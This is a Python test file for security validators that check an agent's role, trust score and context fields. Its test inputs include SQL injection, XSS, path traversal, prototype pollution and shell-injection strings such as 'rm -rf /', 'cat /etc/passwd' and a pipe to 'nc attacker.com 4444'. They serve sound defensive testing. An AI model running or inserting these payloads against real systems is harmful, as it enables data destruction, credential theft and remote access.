"""
Test secure agent validation behavior.

These tests validate SECURITY PROPERTIES, not just error messages.
They ensure the system is actually secure, not just that it passes tests.
"""

import json
import math
import tempfile
from pathlib import Path
import pytest

# Import the SECURE validation functions
from vault.utils.security_validators_secure import (
    validate_agent_context,
    validate_role,
    validate_trust_score,
    SecurityValidationError,
)


class TestSecureRoleValidation:
    """Test role validation with security focus."""
    
    def test_role_required(self):
        """Missing role should be clearly identified as required."""
        with pytest.raises(SecurityValidationError, match="role is required"):
            validate_role(None)
    
    def test_role_type_validation(self):
        """Non-string types should be rejected with clear type error."""
        invalid_types = [
            (123, "int"),
            (12.3, "float"),
            (True, "bool"),
            (["admin"], "list"),
            ({"role": "admin"}, "dict"),
        ]
        
        for value, type_name in invalid_types:
            with pytest.raises(SecurityValidationError, match=f"role must be a string, got {type_name}"):
                validate_role(value)
    
    def test_empty_role_rejected(self):
        """Empty or whitespace-only roles should be rejected."""
        empty_values = ["", "   ", "\t", "\n", "\r\n", "  \t  "]
        
        for empty in empty_values:
            with pytest.raises(SecurityValidationError, match="role cannot be empty"):
                validate_role(empty)
    
    def test_sql_injection_in_role(self):
        """SQL injection attempts in role should be rejected."""
        sql_attacks = [
            "admin'; DROP TABLE users;--",
            "admin' OR '1'='1",
            "admin'; DELETE FROM accounts;--",
            "admin' UNION SELECT * FROM passwords--",
        ]
        
        for attack in sql_attacks:
            with pytest.raises(SecurityValidationError, match="SQL injection"):
                validate_role(attack)
    
    def test_xss_in_role(self):
        """XSS attempts in role should be rejected."""
        xss_attacks = [
            "<script>alert('xss')</script>",
            "admin<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "admin' onmouseover='alert(1)'",
        ]
        
        for attack in xss_attacks:
            with pytest.raises(SecurityValidationError, match="XSS attempt"):
                validate_role(attack)
    
    def test_command_injection_in_role(self):
        """Command injection attempts should be rejected."""
        cmd_attacks = [
            "admin; rm -rf /",
            "admin && cat /etc/passwd",
            "admin | nc attacker.com 4444",
            "admin`whoami`",
        ]
        
        for attack in cmd_attacks:
            with pytest.raises(SecurityValidationError, match="Shell metacharacter"):
                validate_role(attack)
    
    def test_unicode_normalization(self):
        """Unicode should be normalized to prevent homograph attacks."""
        # Using different Unicode representations of 'admin'
        result = validate_role("ａｄｍｉｎ")  # Full-width characters
        assert result == "admin"  # Should be normalized to ASCII
    
    def test_valid_roles_accepted(self):
        """Valid roles should be accepted and normalized."""
        valid_roles = [
            ("admin", "admin"),
            ("  user  ", "user"),  # Whitespace trimmed
            ("ANALYST", "ANALYST"),  # Case preserved
            ("test_user", "test_user"),  # Underscores OK
        ]
        
        for input_role, expected in valid_roles:
            result = validate_role(input_role)
            assert result == expected


class TestSecureTrustScoreValidation:
    """Test trustScore validation with security focus."""
    
    def test_trustscore_required_for_simulate(self):
        """Missing trustScore should be rejected when required."""
        with pytest.raises(SecurityValidationError, match="trustScore is required"):
            validate_trust_score(None, required=True)
    
    def test_trustscore_optional_returns_none(self):
        """Optional trustScore should return None when missing."""
        result = validate_trust_score(None, required=False)
        assert result is None
    
    def test_boolean_rejected_explicitly(self):
        """Boolean values should be rejected with specific error."""
        with pytest.raises(SecurityValidationError, match="trustScore cannot be a boolean"):
            validate_trust_score(True)
        
        with pytest.raises(SecurityValidationError, match="trustScore cannot be a boolean"):
            validate_trust_score(False)
    
    def test_string_numbers_converted_to_float(self):
        """String numbers should be converted to float for security."""
        test_cases = [
            ("80", 80.0),
            ("80.5", 80.5),
            ("0", 0.0),
            ("100", 100.0),
            (" 50 ", 50.0),  # Whitespace trimmed
        ]
        
        for string_value, expected_float in test_cases:
            result = validate_trust_score(string_value)
            assert isinstance(result, float), f"Expected float, got {type(result)}"
            assert result == expected_float
    
    def test_infinity_rejected(self):
        """Infinity values should be rejected."""
        infinity_values = [
            float('inf'),
            float('-inf'),
            "infinity",
            "Infinity",
            "inf",
            "-inf",
        ]
        
        for inf_value in infinity_values:
            with pytest.raises(SecurityValidationError, match="cannot be Infinity"):
                validate_trust_score(inf_value)
    
    def test_nan_rejected(self):
        """NaN values should be rejected."""
        nan_values = [
            float('nan'),
            "nan",
            "NaN",
            "NAN",
        ]
        
        for nan_value in nan_values:
            with pytest.raises(SecurityValidationError, match="cannot be NaN"):
                validate_trust_score(nan_value)
    
    def test_out_of_range_rejected(self):
        """Values outside 0-100 range should be rejected."""
        out_of_range = [
            (-1, "cannot be negative"),
            (-0.1, "cannot be negative"),
            (-100, "cannot be negative"),
            (101, "cannot exceed 100"),
            (100.1, "cannot exceed 100"),
            (1000, "cannot exceed 100"),
        ]
        
        for value, expected_msg in out_of_range:
            with pytest.raises(SecurityValidationError, match=expected_msg):
                validate_trust_score(value)
    
    def test_injection_in_numeric_string(self):
        """Injection attempts in numeric strings should be rejected."""
        injections = [
            "80; DROP TABLE users",
            "80 OR 1=1",
            "80' --",
            "80<script>alert(1)</script>",
        ]
        
        for injection in injections:
            with pytest.raises(SecurityValidationError, match="invalid characters"):
                validate_trust_score(injection)
    
    def test_non_numeric_types_rejected(self):
        """Non-numeric types should be rejected."""
        invalid_types = [
            (["80"], "list"),
            ({"score": 80}, "dict"),
            (object(), "object"),
        ]
        
        for value, type_name in invalid_types:
            with pytest.raises(SecurityValidationError, match=f"must be numeric, got {type_name}"):
                validate_trust_score(value)


class TestSecureAgentContextValidation:
    """Test full agent context validation with security focus."""
    
    def test_valid_agent_normalized(self):
        """Valid agent should be accepted with normalized values."""
        input_context = {
            "role": "  user  ",
            "trustScore": "80",  # String that should be converted
            "department": "  IT  ",
        }
        
        result = validate_agent_context(input_context)
        
        # Check normalization
        assert result["role"] == "user"  # Trimmed
        assert result["trustScore"] == 80.0  # Converted to float
        assert isinstance(result["trustScore"], float)
        assert result["department"] == "IT"  # Trimmed
    
    def test_sql_injection_in_any_field(self):
        """SQL injection in any field should be rejected."""
        contexts = [
            {"role": "user", "trustScore": 80, "dept": "IT'; DROP TABLE--"},
            {"role": "user", "trustScore": 80, "name": "Bob' OR '1'='1"},
        ]
        
        for context in contexts:
            with pytest.raises(SecurityValidationError, match="SQL injection"):
                validate_agent_context(context)
    
    def test_prototype_pollution_rejected(self):
        """Prototype pollution attempts should be rejected."""
        contexts = [
            {"role": "user", "trustScore": 80, "__proto__": "polluted"},
            {"role": "user", "trustScore": 80, "constructor": {"prototype": "bad"}},
        ]
        
        for context in contexts:
            with pytest.raises(SecurityValidationError, match="Prototype pollution"):
                validate_agent_context(context)
    
    def test_deeply_nested_json_rejected(self):
        """Deeply nested JSON should be rejected to prevent DoS."""
        # Create deeply nested structure
        deep = {"a": 1}
        current = deep
        for _ in range(150):  # More than MAX_JSON_DEPTH
            current["nested"] = {"a": 1}
            current = current["nested"]
        
        context = {
            "role": "user",
            "trustScore": 80,
            "data": deep
        }
        
        with pytest.raises(SecurityValidationError, match="JSON nesting too deep"):
            validate_agent_context(context)
    
    def test_oversized_context_rejected(self):
        """Oversized contexts should be rejected."""
        context = {
            "role": "user",
            "trustScore": 80,
            "data": "x" * (11 * 1024 * 1024)  # 11MB, over limit
        }
        
        with pytest.raises(SecurityValidationError, match="too large"):
            validate_agent_context(context)
    
    def test_simulate_vs_redact_trustscore_requirement(self):
        """Simulate requires trustScore, redact makes it optional."""
        context_no_score = {"role": "user"}
        
        # Simulate (default) requires trustScore
        with pytest.raises(SecurityValidationError, match="must contain 'trustScore' field"):
            validate_agent_context(context_no_score, source="agent")
        
        # Redact allows missing trustScore
        result = validate_agent_context(context_no_score, source="agent-redact")
        assert "trustScore" not in result
        assert result["role"] == "user"
    
    def test_unknown_field_types_rejected(self):
        """Unknown field types should be rejected."""
        context = {
            "role": "user",
            "trustScore": 80,
            "callback": lambda x: x,  # Function not allowed
        }
        
        with pytest.raises(SecurityValidationError, match="unsupported type"):
            validate_agent_context(context)
    
    def test_comprehensive_attack_scenario(self):
        """Test a realistic attack combining multiple vectors."""
        attack_context = {
            "role": "admin' OR '1'='1",  # SQL injection
            "trustScore": float('inf'),  # Infinity attack
            "name": "<script>alert(1)</script>",  # XSS
            "dept": "../../../etc/passwd",  # Path traversal
            "__proto__": {"isAdmin": True},  # Prototype pollution
        }
        
        # Should fail on the first security check (role SQL injection)
        with pytest.raises(SecurityValidationError) as exc_info:
            validate_agent_context(attack_context)
        
        # Verify it caught at least one attack
        error_msg = str(exc_info.value).lower()
        assert any(word in error_msg for word in ['sql', 'injection', 'required'])


class TestSecurityProperties:
    """Test that security properties hold, not just specific behaviors."""
    
    def test_no_type_confusion_possible(self):
        """String and numeric trustScores should behave identically."""
        context1 = validate_agent_context({"role": "user", "trustScore": "80"})
        context2 = validate_agent_context({"role": "user", "trustScore": 80})
        
        # Both should be float
        assert isinstance(context1["trustScore"], float)
        assert isinstance(context2["trustScore"], float)
        assert context1["trustScore"] == context2["trustScore"]
    
    def test_no_information_leakage_in_errors(self):
        """Error messages should not leak system information."""
        # This would be tested with the sanitize_error_message function
        # Errors should not contain file paths, line numbers, etc.
        pass
    
    def test_deterministic_validation(self):
        """Same input should always produce same output."""
        context = {"role": "user", "trustScore": 80}
        
        results = [validate_agent_context(context.copy()) for _ in range(10)]
        
        # All results should be identical
        for result in results[1:]:
            assert result == results[0]


def test_security_reasoning():
    """
    Document the security reasoning behind our validation choices.
    
    This test serves as executable documentation of our security decisions.
    """
    security_decisions = {
        "string_to_float_conversion": {
            "reason": "Prevents type confusion attacks where '80' > '9' but 80 > 9",
            "example": "trustScore comparisons must be numeric",
            "impact": "HIGH - Could bypass security checks"
        },
        "sql_injection_rejection": {
            "reason": "Prevents database manipulation through user input",
            "example": "role = \"admin'; DROP TABLE users;--\"",
            "impact": "CRITICAL - Could destroy database"
        },
        "infinity_nan_rejection": {
            "reason": "Prevents comparison bypass attacks",
            "example": "trustScore = Infinity always passes > checks",
            "impact": "HIGH - Could grant unauthorized access"
        },
        "unicode_normalization": {
            "reason": "Prevents homograph attacks using lookalike characters",
            "example": "аdmin (Cyrillic) vs admin (Latin)",
            "impact": "MEDIUM - Could impersonate roles"
        },
        "prototype_pollution_rejection": {
            "reason": "Prevents object prototype manipulation",
            "example": "__proto__.isAdmin = true",
            "impact": "HIGH - Could escalate privileges"
        },
        "size_limits": {
            "reason": "Prevents DoS through memory exhaustion",
            "example": "10MB JSON payload",
            "impact": "MEDIUM - Could crash service"
        },
        "depth_limits": {
            "reason": "Prevents DoS through stack overflow",
            "example": "Deeply nested JSON objects",
            "impact": "MEDIUM - Could crash service"
        }
    }
    
    # This test always passes but documents our reasoning
    assert all(decision["impact"] in ["LOW", "MEDIUM", "HIGH", "CRITICAL"] 
              for decision in security_decisions.values())